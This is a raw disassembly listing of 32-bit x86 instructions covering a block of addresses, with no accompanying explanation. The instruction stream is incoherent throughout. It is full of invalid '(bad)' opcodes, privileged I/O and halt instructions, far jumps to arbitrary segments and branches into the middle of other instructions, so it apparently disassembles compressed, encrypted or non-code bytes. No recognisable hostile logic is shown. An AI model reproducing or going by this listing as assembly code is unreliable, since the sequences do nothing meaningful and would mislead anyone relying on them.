  42fe08:	push   ebx
  42fe09:	mov    DWORD PTR [ecx+0x2a],eax
  42fe0c:	pop    ds
  42fe0d:	pop    esp
  42fe0e:	xchg   ebp,eax
  42fe0f:	jmp    0x42fe57
  42fe11:	push   0x23438ae4
  42fe16:	push   ebx
  42fe17:	push   eax
  42fe18:	rol    ebp,0x39
  42fe1b:	pop    ebp
  42fe1c:	icebp  
  42fe1d:	push   ebp
  42fe1e:	push   ecx
  42fe1f:	xchg   esp,eax
  42fe20:	mov    edx,0xc1cca86
  42fe25:	ror    BYTE PTR [eax-0x4f],cl
  42fe28:	pop    ebp
  42fe29:	scas   eax,DWORD PTR es:[edi]
  42fe2a:	call   FWORD PTR [esi]
  42fe2c:	push   esi
  42fe2d:	jmp    0x42fea7
  42fe2f:	sti    
  42fe30:	sub    bh,BYTE PTR [edi+ebx*2]
  42fe33:	outs   dx,BYTE PTR ds:[esi]
  42fe34:	(bad)  
  42fe35:	shl    BYTE PTR [ecx],cl
  42fe37:	pop    edi
  42fe38:	push   cs
  42fe39:	mov    ebx,0x88a11ba0
  42fe3e:	sub    DWORD PTR [ebp-0x48],ebp
  42fe41:	dec    esp
  42fe42:	nop
  42fe43:	lds    esp,FWORD PTR [edi]
  42fe45:	(bad)  
  42fe47:	loopne 0x42fe20
  42fe49:	adc    esi,esp
  42fe4b:	outs   dx,BYTE PTR ds:[esi]
  42fe4c:	icebp  
  42fe4d:	loope  0x42fe2a
  42fe4f:	push   ss
  42fe50:	mov    ds:0x53804775,al
  42fe55:	pextrw eax,(bad),0xc5
  42fe57:	inc    ebp
  42fe58:	add    DWORD PTR [ebp*1-0x6173537b],0x964c51cc
  42fe63:	pop    eax
  42fe64:	ja     0x42fec9
  42fe66:	or     BYTE PTR [edi-0x64807323],al
  42fe6c:	(bad)  
  42fe6d:	jae    0x42fe6e
  42fe6f:	xor    DWORD PTR [esi+0x678cd023],eax
  42fe75:	add    DWORD PTR [edi+0x716767a1],0xffffffbb
  42fe7c:	or     al,0xb8
  42fe7e:	lds    ecx,FWORD PTR [edx-0x63ca35a7]
  42fe84:	ret    0xfdcd
  42fe87:	cmp    ebx,esi
  42fe89:	mov    bl,cl
  42fe8b:	ror    DWORD PTR [esi-0x33],cl
  42fe8e:	ins    BYTE PTR es:[edi],dx
  42fe8f:	mov    ds:0xd7897e92,eax
  42fe94:	cli    
  42fe95:	mov    edi,0x157e7f52
  42fe9a:	mov    ah,0x54
  42fe9c:	in     eax,dx
  42fe9d:	loopne 0x42fe53
  42fe9f:	add    al,dh
  42fea1:	(bad)  
  42fea2:	ficomp DWORD PTR [esi-0x6f]
  42fea5:	sbb    DWORD PTR [edi],ecx
  42fea7:	inc    DWORD PTR ds:[di-0x66]
  42feac:	out    dx,eax
  42fead:	jge    0x42feb9
  42feaf:	mov    ebx,0xdbb1402c
  42feb4:	(bad)  
  42feb5:	std    
  42feb6:	(bad)  
  42feb7:	jl     0x42fe46
  42feb9:	je     0x42ff33
  42febb:	inc    ecx
  42febc:	sub    dl,bl
  42febe:	cmp    BYTE PTR [ebp-0x29],bl
  42fec1:	pop    edi
  42fec2:	sub    eax,0x50447dca
  42fec7:	dec    ecx
  42fec8:	(bad)  
  42fec9:	loop   0x42ff0d
  42fecb:	xchg   esp,eax
  42fecc:	pushf  
  42fecd:	push   ss
  42fece:	jnp    0x42fea8
  42fed0:	aam    0x87
  42fed2:	rcl    DWORD PTR [eax],0x13
  42fed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fed6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42fed8:	arpl   di,si
  42feda:	or     eax,0x1f793c8c
  42fedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fee0:	xchg   edx,eax
  42fee1:	dec    edi
  42fee2:	adc    al,0x5a
  42fee4:	sbb    al,0xc3
  42fee6:	call   0x1e8db40d
  42feeb:	stos   DWORD PTR es:[edi],eax
  42feec:	inc    edi
  42feed:	call   0xade14492
  42fef2:	leave  
  42fef3:	enter  0x2bd4,0xd3
  42fef7:	lods   al,BYTE PTR ds:[esi]
  42fef8:	jnp    0x42fee1
  42fefa:	xor    ah,BYTE PTR ss:[ebx+0xcd06233]
  42ff01:	sub    al,0xbe
  42ff03:	mov    esp,0x945ce248
  42ff08:	xor    BYTE PTR [esi],0x39
  42ff0b:	stos   DWORD PTR es:[edi],eax
  42ff0c:	push   esp
  42ff0d:	mov    ds:0x8be84079,eax
  42ff12:	push   eax
  42ff13:	push   esp
  42ff14:	mov    ds:0x57300b41,eax
  42ff19:	lds    esi,FWORD PTR [ecx-0x36]
  42ff1c:	sub    dh,BYTE PTR [edi+0x3bab10ff]
  42ff22:	sub    eax,0x67685fdc
  42ff27:	jmp    0xb389:0x77fe31df
  42ff2e:	lahf   
  42ff2f:	mov    edi,0x46d5a397
  42ff34:	loopne 0x42ff65
  42ff36:	inc    ecx
  42ff37:	mov    ds:0xdea89d1,eax
  42ff3c:	mov    eax,ds:0x3433f38e
  42ff41:	add    bh,BYTE PTR [ebp-0x5ceb9730]
  42ff47:	push   edx
  42ff48:	mov    bh,0xd5
  42ff4a:	shl    DWORD PTR [edi+0x7d],1
  42ff4d:	xor    al,0x58
  42ff4f:	mov    ecx,DWORD PTR [esi+0x1]
  42ff52:	push   esp
  42ff53:	jne    0x42ffac
  42ff55:	push   edx
  42ff56:	pop    edi
  42ff57:	mov    al,0x16
  42ff59:	fst    QWORD PTR [ebx-0x72fb96fc]
  42ff5f:	int3   
  42ff60:	mov    edx,0x936d5505
  42ff65:	push   esp
  42ff66:	mov    ebp,DWORD PTR [edi+edi*1]
  42ff69:	lea    ebp,[ecx]
  42ff6b:	mov    ah,0xaa
  42ff6d:	js     0x42ffb3
  42ff6f:	xor    ebx,DWORD PTR [ebx+eax*4]
  42ff72:	lahf   
  42ff73:	jl     0x42ff98
  42ff75:	ins    DWORD PTR es:[edi],dx
  42ff76:	(bad)  
  42ff78:	or     DWORD PTR [esi],esp
  42ff7a:	outs   dx,DWORD PTR ds:[esi]
  42ff7b:	push   eax
  42ff7c:	add    al,0x6c
  42ff7e:	mov    edx,0x82e5662e
  42ff83:	(bad)  
  42ff84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff85:	mov    cl,0x47
  42ff87:	lds    esi,FWORD PTR [ebx+0x7b]
  42ff8a:	sub    esp,esp
  42ff8c:	mov    dl,0xb2
  42ff8e:	or     DWORD PTR [ecx+0xa],ecx
  42ff91:	add    DWORD PTR [ebx],edi
  42ff93:	push   ds
  42ff94:	imul   edx,DWORD PTR [eax+0x5969ece8],0xffffffbc
  42ff9b:	add    al,BYTE PTR [ecx]
  42ff9d:	mov    eax,DWORD PTR [edi-0x2ce3873b]
  42ffa3:	int3   
  42ffa4:	xor    DWORD PTR [edx+0x76cca262],esi
  42ffaa:	and    esp,DWORD PTR [esi-0x7f]
  42ffad:	je     0x42ff84
  42ffaf:	bound  eax,QWORD PTR [edx]
  42ffb1:	push   edi
  42ffb2:	test   DWORD PTR [esi],0x7ac19d02
  42ffb8:	imul   ebp,DWORD PTR [ecx-0x5ced463b],0x2f
  42ffbf:	std    
  42ffc0:	sahf   
  42ffc1:	jo     0x42ff52
  42ffc3:	rol    BYTE PTR [edx],1
  42ffc5:	mov    bh,0xf0
  42ffc7:	in     al,0xf9
  42ffc9:	mov    esp,0x7302e278
  42ffce:	mov    ds:0xfa36fa09,eax
  42ffd3:	icebp  
  42ffd4:	add    al,0x22
  42ffd6:	cmc    
  42ffd7:	dec    ecx
  42ffd8:	mov    esp,0xa7bf2da1
  42ffdd:	bound  edx,QWORD PTR [edx]
  42ffdf:	es sub eax,0xedc2e028
  42ffe5:	lahf   
  42ffe6:	mov    ds:0x176bc2f8,al
  42ffeb:	pop    DWORD PTR [ebx-0x51d32152]
  42fff1:	mov    al,ds:0xff7b8983
  42fff6:	mov    dl,0x5c
  42fff8:	and    ebp,DWORD PTR [esi-0x4508c3]
  42fffe:	stc    
  42ffff:	cs mov ch,0x9d
  430002:	jmp    0x42ff88
  430004:	cmp    bl,al
  430006:	xor    DWORD PTR [edi+0x1f],eax
  430009:	jecxz  0x42ffff
  43000b:	(bad)  
  43000c:	jnp    0x42fff3
  43000e:	in     eax,0x3e
  430010:	xchg   bl,bl
  430012:	outs   dx,DWORD PTR ds:[esi]
  430013:	and    dl,BYTE PTR [ebx]
  430015:	dec    ebx
  430016:	or     ebx,esp
  430018:	lods   al,BYTE PTR ds:[esi]
  430019:	xchg   edx,eax
  43001a:	sahf   
  43001b:	pop    ebp
  43001c:	adc    al,cl
  43001e:	adc    eax,DWORD PTR [ebx+0x33]
  430021:	pop    ss
  430022:	mov    eax,ds:0x58a76b6d
  430027:	rcr    DWORD PTR [edx],1
  430029:	rcl    DWORD PTR [ebx],1
  43002b:	jae    0x42ffe1
  43002d:	pop    edi
  43002e:	mov    ecx,0x43ba4c9a
  430033:	loopne 0x430095
  430035:	sbb    dh,BYTE PTR [ebx+0x7e]
  430038:	sahf   
  430039:	mov    ecx,0x5ff4a313
  43003e:	ins    DWORD PTR es:[edi],dx
  43003f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430040:	jns    0x4300a5
  430042:	or     al,0x83
  430044:	cmc    
  430045:	std    
  430046:	sbb    ah,ch
  430048:	jae    0x430076
  43004a:	or     DWORD PTR [edi+0x5c],eax
  43004d:	sbb    bh,BYTE PTR [edx+0x9]
  430050:	push   ebx
  430051:	pop    ecx
  430052:	scas   al,BYTE PTR es:[edi]
  430053:	loope  0x430010
  430055:	xchg   ebx,eax
  430056:	dec    edx
  430057:	push   edx
  430058:	mov    dh,0x35
  43005a:	sub    esi,DWORD PTR [ebx+eiz*4+0x64]
  43005e:	adc    al,0xe1
  430060:	xchg   edx,eax
  430061:	dec    ebp
  430062:	dec    edi
  430063:	sub    BYTE PTR [bx+si+0x74b2],bh
  430068:	ins    BYTE PTR es:[edi],dx
  430069:	fld    DWORD PTR [ecx+0x2e077029]
  43006f:	push   edi
  430070:	pop    ss
  430071:	into   
  430072:	maxps  xmm1,XMMWORD PTR [esi-0xc]
  430076:	inc    BYTE PTR [ebp-0x72]
  430079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43007a:	cs sub ah,ch
  43007d:	cmp    DWORD PTR [edx],ebx
  43007f:	cdq    
  430080:	ins    DWORD PTR es:[edi],dx
  430081:	sub    eax,edi
  430083:	aas    
  430084:	xchg   ebp,eax
  430085:	hlt    
  430086:	cmp    eax,0xb73c8154
  43008b:	xor    BYTE PTR cs:[edx],ch
  43008e:	jmp    0xd54:0xecd1a4ed
  430095:	or     al,0xb1
  430097:	rcr    BYTE PTR [eax],cl
  430099:	xchg   DWORD PTR [esi-0x2c565d26],ebp
  43009f:	add    edx,DWORD PTR [ebp+0x58]
  4300a2:	adc    ah,BYTE PTR [esi+0xaa4b471]
  4300a8:	xchg   BYTE PTR [ebx+esi*4+0x49],dl
  4300ac:	int    0xc0
  4300ae:	test   al,0x84
  4300b0:	xor    ebp,edx
  4300b2:	cs dec ebp
  4300b4:	mov    ebx,0xde5fb6ef
  4300b9:	mov    bh,dh
  4300bb:	cli    
  4300bc:	dec    dx
  4300be:	push   ebp
  4300bf:	and    esp,ebp
  4300c1:	bound  ecx,QWORD PTR [ecx]
  4300c3:	mov    ds:0x59b30250,eax
  4300c8:	xor    ebx,esp
  4300ca:	push   cs
  4300cb:	lods   al,BYTE PTR ds:[esi]
  4300cc:	pop    es
  4300cd:	movlps xmm3,QWORD PTR [ebx-0x49449fb5]
  4300d4:	xchg   ebx,eax
  4300d5:	(bad)  
  4300d7:	ret    
  4300d8:	inc    esp
  4300d9:	xchg   BYTE PTR [edx],cl
  4300db:	pushf  
  4300dc:	aas    
  4300dd:	push   esi
  4300de:	adc    al,0x7a
  4300e0:	bound  esi,QWORD PTR [bx+si-0x49]
  4300e4:	xchg   edi,eax
  4300e5:	or     edi,ebx
  4300e7:	adc    ch,BYTE PTR [eax-0x74]
  4300ea:	push   0xfffffff3
  4300ec:	mov    ebx,0x9d5728ba
  4300f1:	mov    eax,0xf85c0c7b
  4300f6:	iret   
  4300f7:	dec    ecx
  4300f8:	add    BYTE PTR [edx+0x5a1b5c12],0x49
  4300ff:	cs aad 0x88
  430102:	dec    edi
  430103:	retf   
  430104:	dec    BYTE PTR [edx-0x8f6c9ff]
  43010a:	(bad)  
  43010b:	inc    esi
  43010c:	add    DWORD PTR [edi],0x37
  43010f:	xchg   DWORD PTR [ecx-0x51],esi
  430112:	jnp    0x4300bf
  430114:	lods   al,BYTE PTR ds:[esi]
  430115:	mov    bl,0x93
  430117:	jb     0x4300fe
  430119:	adc    dh,bl
  43011b:	ss sub ecx,edi
  43011e:	mov    ah,0x7c
  430120:	jae    0x4300db
  430122:	xor    eax,0xb37a1abc
  430127:	stos   DWORD PTR es:[edi],eax
  430128:	jp     0x4300c8
  43012a:	stos   BYTE PTR es:[edi],al
  43012b:	(bad)  
  43012c:	jle    0x430159
  43012e:	pop    ecx
  43012f:	fs out dx,al
  430131:	(bad)  
  430132:	(bad)  [eax+0x5baa9b9d]
  430138:	inc    ecx
  430139:	(bad)  ds:0xdbfdb01b
  43013f:	cmp    eax,0x4cfe96e4
  430144:	mov    eax,ds:0xe4471152
  430149:	and    BYTE PTR [edx+0x7a],bh
  43014c:	pop    edx
  43014d:	cmp    al,0xbb
  43014f:	push   ebx
  430150:	nop
  430151:	gs pop edx
  430153:	sbb    al,0x89
  430155:	cdq    
  430156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430157:	xor    eax,0x160e825d
  43015c:	add    al,0xa1
  43015e:	pop    ecx
  43015f:	lock jbe 0x430170
  430162:	mov    BYTE PTR [ebx-0x36],ah
  430165:	jb     0x430148
  430167:	stc    
  430168:	jecxz  0x43015c
  43016a:	mov    bl,0x18
  43016c:	out    dx,eax
  43016d:	sub    ecx,ebx
  43016f:	add    eax,0xa7bb48ed
  430174:	test   esp,esp
  430176:	les    ebx,FWORD PTR [esi+ebx*8]
  430179:	mov    al,0x83
  43017b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43017c:	xlat   BYTE PTR ds:[ebx]
  43017d:	out    0xe9,al
  43017f:	jg     0x43016c
  430181:	and    BYTE PTR [ebx-0x30b6c581],ah
  430187:	int    0xdd
  430189:	sub    al,0x89
  43018b:	mov    WORD PTR [esi+eax*2-0x6a],ss
  43018f:	push   0x2ac619de
  430194:	scas   al,BYTE PTR es:[edi]
  430195:	xlat   BYTE PTR ds:[ebx]
  430196:	mov    dl,0xe9
  430198:	pop    ds
  430199:	in     eax,0xd6
  43019b:	mov    ds:0x88ffb331,al
  4301a0:	aad    0x2f
  4301a2:	sub    ebx,esp
  4301a4:	jl     0x430135
  4301a6:	sbb    BYTE PTR [ebx+0xb],bh
  4301a9:	xchg   ebp,eax
  4301aa:	pop    esp
  4301ab:	adc    BYTE PTR [edx+0x4c],0x28
  4301af:	out    dx,al
  4301b0:	add    ebp,DWORD PTR [edi]
  4301b2:	nop
  4301b3:	cli    
  4301b4:	mov    edi,0xe985e47f
  4301b9:	push   0xd5fccfd
  4301be:	cmp    ebx,DWORD PTR [ebp-0x12b30a2e]
  4301c4:	mov    ebp,0x7d53e62a
  4301c9:	sbb    eax,0x5a6fc955
  4301ce:	fbld   TBYTE PTR [ebx]
  4301d0:	gs sbb al,0xd4
  4301d3:	test   eax,0x30ebca80
  4301d8:	je     0x4301c4
  4301da:	std    
  4301db:	add    BYTE PTR [esi+eax*8-0x68],dl
  4301df:	loop   0x43025f
  4301e1:	or     dh,BYTE PTR [esi]
  4301e3:	sub    cl,al
  4301e5:	pusha  
  4301e6:	stc    
  4301e7:	(bad)  
  4301e8:	std    
  4301e9:	mov    esp,0x336caa72
  4301ee:	(bad)  
  4301ef:	jecxz  0x430234
  4301f1:	lds    ebx,FWORD PTR [ecx]
  4301f3:	xor    DWORD PTR [edx+edx*2],0x44
  4301f7:	cmp    ebx,edi
  4301f9:	jl     0x430208
  4301fb:	ins    DWORD PTR es:[edi],dx
  4301fc:	pop    edi
  4301fd:	sti    
  4301fe:	sbb    al,0xce
  430200:	int    0x97
  430202:	retf   0x847d
  430205:	jmp    0x43026e
  430207:	fs repz (bad) 
  43020a:	lahf   
  43020b:	adc    cl,al
  43020d:	nop
  43020e:	mov    edi,0x78595b0a
  430213:	cmc    
  430214:	sbb    bl,ch
  430216:	ja     0x4301d7
  430218:	mov    cl,0x1e
  43021a:	mov    ecx,0x93f69b37
  43021f:	dec    edi
  430220:	retf   
  430221:	out    0x1b,al
  430223:	aaa    
  430224:	mov    dl,0x34
  430226:	mov    esi,0x230bd19f
  43022b:	lods   al,BYTE PTR ds:[esi]
  43022c:	jmp    0x77acc49f
  430231:	loope  0x43021e
  430233:	aam    0x30
  430235:	(bad)  
  430236:	add    BYTE PTR [ebp-0x1c367b94],al
  43023c:	inc    edi
  43023d:	jo     0x4301ed
  43023f:	pop    esi
  430240:	sub    eax,0xe130f290
  430245:	push   cs
  430246:	imul   edi,DWORD PTR [ebp-0x28],0xffffff86
  43024a:	frstor [ebx+0x29a421d5]
  430250:	and    al,0xf2
  430252:	clc    
  430253:	pop    ebx
  430254:	lds    ebp,FWORD PTR [edx]
  430256:	xchg   DWORD PTR [edx+0x14],eax
  430259:	dec    edx
  43025a:	out    0xf1,eax
  43025c:	jbe    0x4302db
  43025e:	dec    eax
  43025f:	xchg   esp,eax
  430260:	ins    DWORD PTR es:[edi],dx
  430261:	lods   eax,DWORD PTR ds:[esi]
  430262:	sbb    BYTE PTR [ecx-0x503c16c4],al
  430268:	xor    DWORD PTR [edx-0x1d],edi
  43026b:	push   edi
  43026c:	lock or bh,dl
  43026f:	imul   edi,ebp,0xffffffee
  430272:	fbld   TBYTE PTR [edx-0x21]
  430275:	mov    esp,0xeeab839a
  43027a:	lods   al,BYTE PTR ds:[esi]
  43027b:	or     esi,DWORD PTR [edi+0x38360d6a]
  430281:	stc    
  430282:	or     al,0x55
  430284:	outs   dx,DWORD PTR ds:[esi]
  430285:	add    DWORD PTR [ebx+0x50418031],esp
  43028b:	retf   0xc7c9
  43028e:	inc    esp
  43028f:	stc    
  430290:	(bad)  [esi+0x8]
  430293:	xor    al,0x3d
  430295:	inc    esi
  430296:	mov    eax,ds:0x75322068
  43029b:	cmp    DWORD PTR [ebx+0x44],ebp
  43029e:	jmp    0xce0ccde8
  4302a3:	es icebp 
  4302a5:	or     BYTE PTR [edi+0x2d30882b],bh
  4302ab:	sbb    eax,0x71b8269f
  4302b0:	sbb    eax,0x481beed6
  4302b5:	popf   
  4302b6:	js     0x430254
  4302b8:	jb     0x430328
  4302ba:	mov    edx,eax
  4302bc:	xchg   edx,eax
  4302bd:	add    DWORD PTR [edi+0x7de8422c],ebp
  4302c3:	and    eax,0x44bbd611
  4302c8:	dec    eax
  4302c9:	and    ch,BYTE PTR [esi+ecx*4]
  4302cc:	pushf  
  4302cd:	addr16 icebp 
  4302cf:	aam    0x39
  4302d1:	ret    0xdbab
  4302d4:	mov    al,0x7a
  4302d6:	ins    DWORD PTR es:[edi],dx
  4302d7:	fmul   DWORD PTR ds:0x4508293
  4302dd:	and    dl,BYTE PTR [esi+0x2c]
  4302e0:	jb     0x43032b
  4302e2:	icebp  
  4302e3:	xchg   esp,eax
  4302e4:	sar    DWORD PTR [esi+eiz*2],1
  4302e7:	mov    eax,ds:0x91a76516
  4302ec:	shl    al,1
  4302ee:	inc    edi
  4302ef:	(bad)  
  4302f0:	shr    DWORD PTR [ebp+0x523062c2],cl
  4302f6:	xor    DWORD PTR [ecx+eiz*8+0x52c0d390],ebp
  4302fd:	mov    dh,0x56
  4302ff:	pop    ss
  430300:	push   es
  430301:	aad    0xf4
  430303:	push   edx
  430304:	aad    0x82
  430306:	stos   DWORD PTR es:[edi],eax
  430307:	xor    dl,BYTE PTR [esi-0x4b]
  43030a:	out    dx,al
  43030b:	arpl   WORD PTR [edx-0x3515d1bf],di
  430311:	test   eax,0x134fc8e
  430316:	jmp    0xefa7:0x3cf6d1a1
  43031d:	lods   eax,DWORD PTR ds:[esi]
  43031e:	sub    al,BYTE PTR [ebx-0x55bc36aa]
  430324:	adc    eax,0xe68d0b78
  430329:	cwde   
  43032a:	stos   BYTE PTR es:[edi],al
  43032b:	or     eax,0xaa1c1ab8
  430330:	cli    
  430331:	in     al,0x69
  430333:	jmp    FWORD PTR [edi+0x7a85975f]
  430339:	xlat   BYTE PTR ds:[ebx]
  43033a:	fs xchg edi,eax
  43033c:	test   DWORD PTR [ebp+0x431bbf2f],ecx
  430342:	xor    BYTE PTR [edi],ah
  430344:	test   al,0xcc
  430346:	or     ebp,0x991321e9
  43034c:	xchg   esp,eax
  43034d:	jge    0x4303bf
  43034f:	or     BYTE PTR [edx+0x5a],bl
  430352:	inc    edi
  430353:	sub    eax,0xe4eb1672
  430358:	jge    0x4302fe
  43035a:	sti    
  43035b:	push   es
  43035c:	cmp    bh,dh
  43035e:	mov    al,ds:0x6b5a6481
  430363:	jle    0x43038e
  430365:	lock fstp DWORD PTR [edi+0x13]
  430369:	and    ebp,DWORD PTR [ecx]
  43036b:	sti    
  43036c:	cmp    BYTE PTR [edi-0x3f],ah
  43036f:	outs   dx,DWORD PTR ds:[esi]
  430370:	stos   DWORD PTR es:[edi],eax
  430371:	push   edx
  430372:	adc    al,0xce
  430374:	fnsave [esi-0x35]
  430377:	add    BYTE PTR ds:0xd0e72f5b,ch
  43037d:	nop    DWORD PTR [ebx-0x46a3d233]
  430384:	mov    ch,0x99
  430386:	repnz fs dec esp
  430389:	sub    BYTE PTR [ebp+0x56e6c081],cl
  43038f:	jns    0x4303b7
  430391:	xor    esi,edi
  430393:	sti    
  430394:	es push 0xe8e073ea
  43039a:	mov    ch,0xa
  43039c:	dec    esp
  43039d:	fild   WORD PTR [edx-0x3a6a5a4b]
  4303a3:	sbb    edi,DWORD PTR [edi+0x54c41cb4]
  4303a9:	ins    DWORD PTR es:[edi],dx
  4303aa:	mov    esi,0x169f9677
  4303af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4303b0:	or     eax,0xba753993
  4303b5:	adc    DWORD PTR ds:[edi],esp
  4303b8:	jge    0x4303a7
  4303ba:	mov    ebx,0x342a1648
  4303bf:	mov    edi,eax
  4303c1:	mov    dh,0xfc
  4303c3:	loope  0x430424
  4303c5:	xor    DWORD PTR [esi+0x7d1f21ea],ebp
  4303cb:	sbb    BYTE PTR [ebx+0x5b],bh
  4303ce:	cwde   
  4303cf:	fcomp  QWORD PTR [esp+ebx*8+0x1d34e4e3]
  4303d6:	cmp    edi,DWORD PTR [edx]
  4303d8:	cmp    ebx,esi
  4303da:	shl    BYTE PTR [ecx],1
  4303dc:	ret    0xfb9b
  4303df:	test   DWORD PTR [edx],ecx
  4303e1:	mov    ah,0x90
  4303e3:	sbb    bl,BYTE PTR [esi+0x4fabb823]
  4303e9:	or     al,0x53
  4303eb:	or     al,0x87
  4303ed:	mov    bl,0x8b
  4303ef:	mov    cl,0xe7
  4303f1:	(bad)
  4303f5:	test   DWORD PTR [edx],esp
  4303f7:	retf   0x58ba
  4303fa:	mov    ah,0x0
  4303fc:	jns    0x4303b8
  4303fe:	outs   dx,DWORD PTR ds:[esi]
  430400:	iret   
  430401:	sbb    DWORD PTR [ebx+ecx*4],esi
  430404:	xchg   edi,eax
  430405:	scas   eax,DWORD PTR es:[edi]
  430406:	pusha  
  430407:	jno    0x430463
  430409:	mov    BYTE PTR [edi],cl
  43040b:	inc    edi
  43040c:	imul   ebx,edi,0xca99161d
  430412:	xchg   ebx,eax
  430413:	jl     0x43045a
  430415:	sbb    al,0xc5
  430417:	push   ds
  430418:	xchg   ebx,eax
  430419:	sbb    cl,bh
  43041b:	out    dx,eax
  43041c:	push   ebx
  43041d:	xor    ecx,DWORD PTR [ecx]
  43041f:	xor    dl,BYTE PTR ds:0x7c4a6aca
  430425:	test   DWORD PTR [edx+0x5c],edx
  430428:	scas   al,BYTE PTR es:[edi]
  430429:	fnstenv [ebx+0x1096a685]
  43042f:	xchg   ebp,eax
  430430:	pop    eax
  430431:	xchg   edi,eax
  430432:	rcl    dh,1
  430434:	popa   
  430435:	retf   0xdabf
  430438:	iret   
  430439:	les    edx,FWORD PTR [edi]
  43043b:	jle    0x4303ff
  43043d:	mov    eax,ds:0xcc38c5ea
  430442:	sbb    BYTE PTR [ebp-0x6b15890a],cl
  430448:	inc    edi
  430449:	sbb    eax,0x5f63aa6d
  43044e:	aad    0xdc
  430450:	push   edi
  430451:	sub    DWORD PTR [ebp+0x654d6ca],edi
  430457:	pop    ebp
  430458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430459:	push   es
  43045a:	xlat   BYTE PTR ds:[ebx]
  43045b:	out    0x47,eax
  43045d:	imul   cl
  43045f:	xchg   ebx,eax
  430460:	adc    DWORD PTR [eax+eiz*4+0x68],0x552a7b65
  430468:	adc    ebp,esi
  43046a:	aam    0x7f
  43046c:	shr    DWORD PTR ss:[eax+0x64395e29],1
  430473:	push   eax
  430474:	int    0x8f
  430476:	push   ebx
  430477:	jecxz  0x43042a
  430479:	push   ebp
  43047a:	jnp    0x4304ad
  43047c:	adc    ecx,DWORD PTR [ebp+0x33ed6a5a]
  430482:	sbb    edi,DWORD PTR [esi-0x203da104]
  430488:	mov    esp,0xa4ece29d
  43048d:	shr    dl,0x4b
  430490:	pop    ecx
  430491:	cmp    bh,cl
  430493:	pop    es
  430494:	xor    al,BYTE PTR [edx]
  430496:	fild   QWORD PTR [edx]
  430498:	repnz pop ss
  43049a:	dec    esi
  43049b:	outs   dx,DWORD PTR ds:[esi]
  43049c:	or     esi,DWORD PTR [ecx-0x6402c738]
  4304a2:	mov    bh,0x92
  4304a4:	imul   edx,DWORD PTR cs:[ebx],0xdbc5e673
  4304ab:	mov    bl,BYTE PTR [eax+0x5a84ca1b]
  4304b1:	in     eax,dx
  4304b2:	sub    al,0x9e
  4304b4:	sbb    BYTE PTR [edi-0x528d3b8d],ch
  4304ba:	fwait
  4304bb:	int3   
  4304bc:	rcr    BYTE PTR [eax],cl
  4304be:	or     esp,edi
  4304c0:	iret   
  4304c1:	mov    al,BYTE PTR [ebp+0x7d]
  4304c4:	das    
  4304c5:	adc    edi,DWORD PTR [ebx+0x7f]
  4304c8:	sub    eax,0x2f57c186
  4304cd:	adc    eax,0x26b48935
  4304d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304d3:	les    ebx,FWORD PTR [edi-0x77]
  4304d6:	cmc    
  4304d7:	jbe    0x4304e1
  4304d9:	and    al,0xc
  4304db:	test   BYTE PTR [ebx],0xe7
  4304de:	push   cs
  4304df:	outs   dx,BYTE PTR ds:[esi]
  4304e0:	lds    esp,FWORD PTR [eax-0x34]
  4304e3:	or     BYTE PTR [esp+edi*4-0x2774f3a6],cl
  4304ea:	retf   
  4304eb:	push   esp
  4304ec:	cwde   
  4304ed:	loop   0x4304e7
  4304ef:	add    DWORD PTR [ebx+eax*4+0x5d],ebp
  4304f3:	loop   0x43051e
  4304f5:	sub    al,0x18
  4304f7:	dec    esp
  4304f8:	inc    esi
  4304f9:	dec    esi
  4304fa:	xor    eax,0x56a546dd
  4304ff:	pop    ebx
  430500:	pop    esi
  430501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430503:	iret   
  430504:	fmul   QWORD PTR [eax-0x10]
  430507:	stos   DWORD PTR es:[edi],eax
  430508:	out    dx,eax
  430509:	adc    eax,0xf14c296e
  43050e:	test   DWORD PTR [edi+0x39],eax
  430511:	adc    eax,0xf8d917ff
  430516:	retf   
  430517:	lds    esi,FWORD PTR [ebx]
  430519:	mov    edi,0x4eddaf88
  43051e:	jb     0x4304dc
  430520:	pop    ebp
  430521:	cmp    al,0xce
  430523:	sbb    ah,cl
  430525:	jge    0x4304c0
  430527:	jp     0x430569
  430529:	(bad)  
  43052a:	sub    al,0xe8
  43052c:	and    esp,DWORD PTR [edx+0xad283b5]
  430532:	push   esi
  430533:	mov    dh,0x5e
  430535:	dec    ebp
  430536:	push   ebp
  430537:	ss mov ebp,0x558a3f34
  43053d:	fmul   QWORD PTR [ebp-0x1c]
  430540:	pop    eax
  430541:	test   BYTE PTR ds:0x4c63b3ef,cl
  430547:	xchg   ebp,eax
  430548:	test   eax,0x8f937678
  43054d:	dec    ebp
  43054e:	or     DWORD PTR [esi+ebp*4],ecx
  430551:	xor    DWORD PTR ds:0xcb7ba459,ebx
  430557:	xchg   DWORD PTR [ecx-0x4b0c1685],ebx
  43055d:	hlt    
  43055e:	mov    dh,0x91
  430560:	mov    WORD PTR [ecx+ebp*4],ss
  430563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430564:	retf   
  430565:	loop   0x4305cc
  430567:	or     BYTE PTR [esp+ebx*1-0x67],0xa3
  43056c:	in     eax,0x92
  43056e:	adc    BYTE PTR [esi],dl
  430570:	mov    eax,ds:0xfbe8118
  430575:	retf   0x741e
  430578:	pusha  
  430579:	je     0x4305b5
  43057b:	or     BYTE PTR [eax],bl
  43057d:	jp     0x4305b7
  43057f:	adc    al,0x10
  430581:	sbb    BYTE PTR [ecx],bl
  430583:	stos   DWORD PTR es:[edi],eax
  430584:	aad    0x23
  430586:	shl    DWORD PTR [ebx],0x34
  430589:	cmp    al,BYTE PTR [ebx]
  43058b:	stos   DWORD PTR es:[edi],eax
  43058c:	sbb    ax,0x229a
  430590:	iret   
  430591:	jmp    0x215d:0x15d791ef
  430598:	add    eax,0x89f98d07
  43059d:	push   cs
